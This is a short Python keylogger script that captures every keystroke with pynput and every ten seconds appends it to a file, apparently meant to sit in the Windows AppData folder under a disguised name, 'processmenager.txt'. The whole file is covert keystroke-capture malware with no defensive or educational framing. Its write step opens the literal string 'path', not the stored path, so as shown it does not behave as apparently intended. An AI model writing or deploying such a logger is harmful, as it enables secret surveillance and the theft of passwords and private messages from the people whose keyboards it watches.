import pynput.keyboard 
import os 
import threading
path = os.environ["appdata"] + "\\processmenager.txt"

log = ''

def process_key(key):
    global log 
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space: 
            log = log + " "
        elif key == key.left: 
            log = log + " "
        elif key == key.right: 
            log = log + " "
        elif key == key.up:
            log = log + " "
        elif key == key.down:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
   

def report(): 
    global log 
    global path 
    f = open("path", "a") 
    f.write(log)
    log = ""
    f.close()
    timer = threading.Timer(10,report)
    timer.start()

def start():
    key_list = pynput.keyboard.Listener(on_press=process_key) 
    with key_list: 
        report()
        key_list.join() 